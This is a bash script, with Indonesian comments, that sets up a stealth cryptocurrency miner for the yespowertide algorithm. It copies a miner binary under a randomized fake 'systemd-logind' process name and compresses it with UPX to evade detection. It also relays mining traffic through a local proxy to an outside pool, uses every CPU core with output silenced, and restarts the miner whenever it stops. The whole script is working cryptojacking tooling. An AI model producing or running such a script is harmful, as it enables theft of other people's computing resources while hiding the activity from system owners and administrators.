#!/bin/bash

# Stealth Process Name
FAKE_NAME="systemd-logind-$(shuf -i 1000-9999 -n 1)"
FAKE_PATH="/usr/local/bin/${FAKE_NAME}"

echo "🔒 Starting Stealth YesPowerTide Setup..."

# ======================
# Stratum Proxy
# ======================
cat <<EOL > .env
REMOTE_HOST=asia.rplant.xyz
REMOTE_PORT=17059
REMOTE_PASSWORD=x
LOCAL_HOST=0.0.0.0
LOCAL_PORT=8080
EOL

npm start > proxy.log 2>&1 &
echo "✅ Proxy started on 127.0.0.1:8080"

sleep 8

# ======================
# Stealth Miner (pakai binary custom kamu)
# ======================
echo "Preparing stealth binary..."
cp /usr/local/bin/miner "$FAKE_PATH"
chmod +x "$FAKE_PATH"

# UPX kalau masih bisa (kadang binary custom sudah di-pack)
upx --best --lzma "$FAKE_PATH" >/dev/null 2>&1 || true

echo "Launching as ${FAKE_NAME}..."

"$FAKE_PATH" \
  -a yespowertide \
  -o stratum+tcps://127.0.0.1:8080 \
  -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
  -p x \
  -t $(nproc --all) \
  --cpu-affinity \
  -B --no-color > /dev/null 2>&1 &

echo "✅ Stealth mining (yespowertide) active with custom binary!"

# Auto restart
while true; do
    sleep 30
    if ! pgrep -f yespowertide > /dev/null 2>&1 && ! pgrep -f miner > /dev/null 2>&1; then
        echo "Miner died, restarting..."
        "$FAKE_PATH" -a yespowertide -o stratum+tcp://127.0.0.1:8080 -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H -p x -t $(nproc --all) -B > /dev/null 2>&1 &
    fi
done
